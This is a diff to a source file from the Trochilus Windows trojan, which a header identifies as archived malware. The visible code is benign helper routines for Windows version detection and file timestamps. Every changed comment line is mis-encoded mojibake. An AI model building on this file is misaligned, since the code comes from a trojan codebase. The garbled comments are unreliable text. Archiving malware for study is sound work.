@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include "file/MyFile.h"
 #include "BinNames.h"
@@ -73,8 +84,8 @@ WIN_VER_DETAIL GetWindowsVersion()
 	OSVERSIONINFOEX osvi = {0};
 	BOOL bOsVersionInfoEx;
 
-	//ÏÈ³¢ÊÔGetVersionExÊ¹ÓÃOSVERSIONINFOEX½á¹¹
-	//Èç¹ûÊ§°Ü£¬¾Í³¢ÊÔÊ¹ÓÃOSVERSIONINFO½á¹¹
+	//ï¿½È³ï¿½ï¿½ï¿½GetVersionExÊ¹ï¿½ï¿½OSVERSIONINFOEXï¿½á¹¹
+	//ï¿½ï¿½ï¿½Ê§ï¿½Ü£ï¿½ï¿½Í³ï¿½ï¿½ï¿½Ê¹ï¿½ï¿½OSVERSIONINFOï¿½á¹¹
 	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
 	if(! (bOsVersionInfoEx = GetVersionEx((OSVERSIONINFO*) &osvi)))
 	{
@@ -92,9 +103,9 @@ WIN_VER_DETAIL GetWindowsVersion()
 
 	switch (osvi.dwPlatformId)
 	{
-		//²âÊÔÊÇ·ñÊÇ Windows NT ²úÆ·¼Ò×å
+		//ï¿½ï¿½ï¿½ï¿½ï¿½Ç·ï¿½ï¿½ï¿½ Windows NT ï¿½ï¿½Æ·ï¿½ï¿½ï¿½ï¿½
 	case VER_PLATFORM_WIN32_NT:
-		//¼à²â¾ßÌåµÄ²úÆ·
+		//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä²ï¿½Æ·
 		if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0)
 		{
 			if(osvi.wProductType == VER_NT_WORKSTATION)
@@ -160,7 +171,7 @@ WIN_VER_DETAIL GetWindowsVersion()
 		}
 		break;
 
-		//²âÊÔÊÇ·ñÊÇWindows Me/98/95.
+		//ï¿½ï¿½ï¿½ï¿½ï¿½Ç·ï¿½ï¿½ï¿½Windows Me/98/95.
 	case VER_PLATFORM_WIN32_WINDOWS:
 		if (osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 0)
 		{
@@ -225,7 +236,7 @@ BOOL GetFileTimes( LPCTSTR filepath, BOOL bIsDir, FILETIME& ftCreationTime, FILE
 	ZeroMemory(&ftLastAccessTime, sizeof(FILETIME));
 	ZeroMemory(&ftLastWriteTime, sizeof(FILETIME));
 
-	//»ñÈ¡ËùÔÚÄ¿Â¼µÄÊ±¼äÊôÐÔ
+	//ï¿½ï¿½È¡ï¿½ï¿½ï¿½ï¿½Ä¿Â¼ï¿½ï¿½Ê±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 	MyFile targetDir;
 	if (! targetDir.Open(filepath, GENERIC_READ, OPEN_EXISTING, FILE_SHARE_READ, (bIsDir ? FILE_FLAG_BACKUP_SEMANTICS : FILE_ATTRIBUTE_NORMAL)))
 	{
